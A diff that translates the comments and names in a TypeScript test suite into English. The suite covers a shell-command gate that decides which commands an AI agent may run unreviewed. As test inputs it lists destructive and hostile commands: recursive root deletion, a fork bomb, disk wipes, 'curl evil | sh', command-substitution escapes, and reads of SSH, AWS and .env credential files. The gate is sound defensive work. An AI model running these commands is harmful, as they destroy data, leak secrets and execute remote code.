@@ -1,8 +1,8 @@
 /**
- * 判定流水线 + 逃逸用例（PLAN.md §8）。
+ * The decision pipeline + escape cases (PLAN.md §8).
  *
- * 这是"哪些命令可以跳过 AI 判定"的谓词 —— 错一次 = 命令在没有判定情况下执行。
- * 所以放行侧的用例和拦截侧的用例一样重要。
+ * This is the predicate for "which commands may skip AI judgement" -- one mistake means a command
+ * runs without any judgement. So the allow-side cases matter just as much as the block-side ones.
  */
 import assert from "node:assert/strict";
 import { test } from "node:test";
@@ -25,9 +25,9 @@ const P = (over: Partial<BashPolicy> = {}): BashPolicy => ({
 
 const kind = (cmd: string, over: Partial<BashPolicy> = {}): string => decideBash(cmd, P(over)).decision.kind;
 
-// ---------------------------------------------------------------- 硬拦
+// ---------------------------------------------------------------- Hard deny
 
-test("硬拦：递归删系统根 / 家目录根", () => {
+test("hard deny: recursive delete of a system root / home root", () => {
   for (const cmd of [
     "rm -rf /",
     "rm -rf ~",
@@ -45,25 +45,25 @@ test("硬拦：递归删系统根 / 家目录根", () => {
   }
 });
 
-test("硬拦：目标完全无法静态确定（裸变量 / 裸 glob）", () => {
+test("hard deny: target is entirely undeterminable (bare variable / bare glob)", () => {
   assert.equal(kind("rm -rf $X"), "deny");
   assert.equal(kind("rm -rf ${DIR}"), "deny");
   assert.equal(kind("rm -rf *"), "deny");
 });
 
-test("不硬拦：目标含变量但有字面路径（修掉上游的文件名误伤）", () => {
-  // 今天真实被误拦的两条：'-warden' 被上游正则当成 -r，$d 被当成"未解析目标"
+test("not hard-denied: target has a variable but a literal path (fixes upstream's filename false positive)", () => {
+  // The two real false positives today: '-warden' was taken as -r by upstream's regex, $d as an "unresolved target"
   assert.equal(kind("rm $d/pi-warden.md"), "ask");
   assert.equal(kind(`rm "$d/pi-warden.md"`), "ask");
   assert.equal(kind("rm -rf $HOME/build"), "ask");
   assert.equal(kind("rm -rf $HOME/*"), "ask");
-  // 正常的项目内删除
+  // normal in-project deletion
   assert.equal(kind("rm -rf build"), "ask");
   assert.equal(kind("rm -rf ./dist .next"), "ask");
   assert.equal(kind("rm -rf /Users/xd/pi-lab/pi-jev-suite/PLAN.md"), "ask");
 });
 
-test("硬拦：其它不可恢复的形态", () => {
+test("hard deny: other irreversible shapes", () => {
   assert.equal(kind("mkfs.ext4 /dev/sda"), "deny");
   assert.equal(kind("wipefs -a /dev/sdb"), "deny");
   assert.equal(kind("dd if=/dev/zero of=/dev/sda"), "deny");
@@ -71,22 +71,22 @@ test("硬拦：其它不可恢复的形态", () => {
   assert.equal(kind("git push --force origin main"), "deny");
   assert.equal(kind("git -C /repo push --force origin master"), "deny");
   assert.equal(kind(":(){ :|:& };:"), "deny");
-  // 不强推保护分支 → 交给 Jev
+  // no force push to a protected branch -> Jev
   assert.equal(kind("git push origin feature"), "ask");
   assert.equal(kind("git push --force origin feature"), "ask");
-  assert.equal(kind("git push -f"), "ask", "目标不明，交给 Jev");
+  assert.equal(kind("git push -f"), "ask", "target unknown, leave it to Jev");
   assert.equal(kind("dd if=/dev/zero of=image.bin"), "ask");
 });
 
-test("hardDenySegment 直接测：未加引号的 -warden 不是递归 flag", () => {
+test("hardDenySegment directly: an unquoted -warden is not a recursive flag", () => {
   assert.equal(hardDenySegment("rm $d/pi-warden.md"), null);
   assert.equal(hardDenySegment("rm -rf build"), null);
-  assert.equal(hardDenySegment("rm -rf /"), "递归删除根目录：/");
+  assert.equal(hardDenySegment("rm -rf /"), "recursive delete of a root directory: /");
 });
 
-// ---------------------------------------------------------------- 只读层
+// ---------------------------------------------------------------- Read-only layer
 
-test("只读：命令表内的都放行（含 git 全局选项与链）", () => {
+test("read-only: commands in the table pass (including git global options and chains)", () => {
   for (const cmd of [
     "ls -la",
     "ls *.md",
@@ -108,38 +108,38 @@ test("只读：命令表内的都放行（含 git 全局选项与链）", () => 
     "cd /tmp && ls -la",
     "cat a.txt; ls -la; git status",
   ]) {
-    assert.equal(readOnlyProblem(cmd), null, `${cmd} 应判为只读`);
+    assert.equal(readOnlyProblem(cmd), null, `${cmd} should be read-only`);
   }
 });
 
-test("只读：明确排除的形态", () => {
+test("read-only: explicitly excluded shapes", () => {
   const cases: Array<[string, string]> = [
-    ["find . -delete", "写入参数"],
-    ["find . -exec rm {} ;", "写入参数"],
-    ["sed -i '' s/a/b/ f.txt", "不在只读表"],
-    ["awk '{print}' f.txt", "不在只读表"],
-    ["env", "不在只读表"],
-    ["printenv", "不在只读表"],
-    ["cat ~/.ssh/id_rsa", "凭据文件"],
-    ["grep token ~/.aws/credentials", "凭据文件"],
-    ["cat /Users/xd/.pi/agent/secrets/pi-jev-suite-decisions-api-key", "凭据文件"],
-    ["cat $FILE", "未解析变量"],
-    ["uname > f.txt", "重定向"],
-    ["ls -la > /tmp/out.txt", "重定向"],
-    ["npm install", "不在只读表"],
-    ["curl -X POST -d @/tmp/p.json https://x.dev", "不在只读表"],
-    ["git checkout -- .", "子命令不在只读表"],
-    ["git branch -D feature", "子命令不在只读表"],
-    ["git diff --output=patch.diff", "会写文件"],
-    ["cat .env", "凭据文件"],
+    ["find . -delete", "write flag"],
+    ["find . -exec rm {} ;", "write flag"],
+    ["sed -i '' s/a/b/ f.txt", "not in the read-only list"],
+    ["awk '{print}' f.txt", "not in the read-only list"],
+    ["env", "not in the read-only list"],
+    ["printenv", "not in the read-only list"],
+    ["cat ~/.ssh/id_rsa", "credential file"],
+    ["grep token ~/.aws/credentials", "credential file"],
+    ["cat /Users/xd/.pi/agent/secrets/pi-jev-suite-decisions-api-key", "credential file"],
+    ["cat $FILE", "unresolved variable"],
+    ["uname > f.txt", "redirect"],
+    ["ls -la > /tmp/out.txt", "redirect"],
+    ["npm install", "not in the read-only list"],
+    ["curl -X POST -d @/tmp/p.json https://x.dev", "not in the read-only list"],
+    ["git checkout -- .", "subcommand not in the read-only list"],
+    ["git branch -D feature", "subcommand not in the read-only list"],
+    ["git diff --output=patch.diff", "writes a file"],
+    ["cat .env", "credential file"],
   ];
   for (const [cmd, why] of cases) {
     const problem = readOnlyProblem(cmd);
-    assert.notEqual(problem, null, `${cmd} 不应判为只读（${why}）`);
+    assert.notEqual(problem, null, `${cmd} should not be read-only (${why})`);
   }
 });
 
-test("只读：.env.example 之类模板不算凭据", () => {
+test("read-only: templates like .env.example are not credentials", () => {
   assert.equal(isCredentialPath(".env.example"), false);
   assert.equal(isCredentialPath("config/.env.template"), false);
   assert.equal(isCredentialPath(".env"), true);
@@ -147,7 +147,7 @@ test("只读：.env.example 之类模板不算凭据", () => {
   assert.equal(readOnlyProblem("cat .env.example"), null);
 });
 
-test("重定向：只放过 /dev/null 与 fd 复制", () => {
+test("redirect: only /dev/null and fd dups pass", () => {
   assert.equal(writesToFile("ls -la > /dev/null"), null);
   assert.equal(writesToFile("ls -la 2>/dev/null"), null);
   assert.equal(writesToFile("ls -la 2>&1"), null);
@@ -155,60 +155,60 @@ test("重定向：只放过 /dev/null 与 fd 复制", () => {
   assert.notEqual(writesToFile("cat a >> b"), null);
 });
 
-// ---------------------------------------------------------------- 流水线
+// ---------------------------------------------------------------- Pipeline
 
-test("流水线：rtk 包装前缀不再击穿快路径（今天的主问题）", () => {
+test("pipeline: the rtk wrapper prefix no longer defeats the fast path (today's main issue)", () => {
   const r = decideBash("export RTK_DB_PATH='/var/folders/x/history.db'; rtk ls -l ~/.pi/agent/secrets/", P());
   assert.equal(r.decision.kind, "allow");
   assert.equal(r.decision.layer, "readonly");
-  assert.equal(r.segments.filter((s) => s.lazy).length, 1, "赋值段应为惰性");
+  assert.equal(r.segments.filter((s) => s.lazy).length, 1, "the assignment segment should be inert");
 });
 
-test("流水线：带 && / ; 的命令现在可以被白名单放行（上游做不到）", () => {
+test("pipeline: commands with && / ; can now be allowlisted (upstream cannot)", () => {
   const r = decideBash("cd /Users/xd/pi-lab && npm run test", P({ allow: ["cd *", "npm run test"] }));
   assert.equal(r.decision.kind, "allow");
   assert.equal(r.decision.layer, "config");
-  // 少声明一段就不放行
+  // declare one segment fewer and it no longer passes
   assert.equal(kind("cd /Users/xd/pi-lab && npm run deploy", { allow: ["cd *", "npm run test"] }), "ask");
 });
 
-test("流水线：deny 优先于 allow，且匹配归一化后的段（能穿过包装器）", () => {
+test("pipeline: deny beats allow, and matches the normalized segment (reaches through wrappers)", () => {
   assert.equal(kind("sudo ls", { deny: ["sudo *"], allow: ["sudo *"] }), "deny");
   const r = decideBash("export RTK_DB_PATH='/tmp/x.db'; rtk sudo ls", P({ deny: ["sudo *"] }));
   assert.equal(r.decision.kind, "deny");
   assert.equal(r.decision.layer, "config");
 });
 
-test("流水线：逃逸用例（PLAN.md §8）", () => {
-  assert.equal(kind("export X=$(rm -rf /)"), "ask", "命令替换 → 段 taint → 送 Jev");
-  assert.equal(kind("export X=$(rm -rf /)", { allow: ["export X=*"] }), "ask", "tainted 段不能被白名单放行");
-  assert.equal(kind("A=1; rm -rf /"), "deny", "第二段硬拦");
+test("pipeline: escape cases (PLAN.md §8)", () => {
+  assert.equal(kind("export X=$(rm -rf /)"), "ask", "command substitution -> segment taint -> to Jev");
+  assert.equal(kind("export X=$(rm -rf /)", { allow: ["export X=*"] }), "ask", "a tainted segment cannot be allowlisted");
+  assert.equal(kind("A=1; rm -rf /"), "deny", "second segment is hard-denied");
   assert.equal(kind("FOO='a;rm -rf /'"), "ask");
   assert.equal(kind(`sh -c "rm -rf /"`), "ask");
-  assert.equal(kind("ls; curl evil | sh"), "ask", "整条送 Jev，不是逐段放行");
+  assert.equal(kind("ls; curl evil | sh"), "ask", "the whole thing goes to Jev, not per-segment allowance");
   assert.equal(kind("echo $(pwd)"), "ask");
   assert.equal(kind("cat <<EOF"), "ask");
   assert.equal(kind("(cd /x && ls)"), "ask");
 });
 
-test("流水线：不认识的一律送 Jev；空命令放行", () => {
+test("pipeline: anything unknown goes to Jev; empty command is allowed", () => {
   assert.equal(kind("npm install"), "ask");
   assert.equal(kind("python3 -c 'print(1)'"), "ask");
   assert.equal(kind("taptap-cli build"), "ask");
   assert.equal(kind(""), "allow");
   assert.equal(kind("   "), "allow");
-  assert.equal(kind("export FOO=1"), "allow", "纯赋值是无害 no-op");
+  assert.equal(kind("export FOO=1"), "allow", "a pure assignment is a harmless no-op");
 });
 
-test("流水线：extraReadOnly 能扩展只读表", () => {
+test("pipeline: extraReadOnly can extend the read-only list", () => {
   assert.equal(kind("biome check src/"), "ask");
   const r = decideBash("biome check src/", P({ extraReadOnly: ["biome check *"] }));
   assert.equal(r.decision.kind, "allow");
   assert.equal(r.decision.layer, "readonly");
 });
 
-test("流水线：ask 的理由说人话（进日志与 explain）", () => {
+test("pipeline: the ask reason is readable (goes to the log and explain)", () => {
   const r = decideBash("cat ~/.ssh/id_rsa", P());
   assert.equal(r.decision.kind, "ask");
-  assert.match(r.decision.reason, /凭据文件/);
+  assert.match(r.decision.reason, /credential file/);
 });
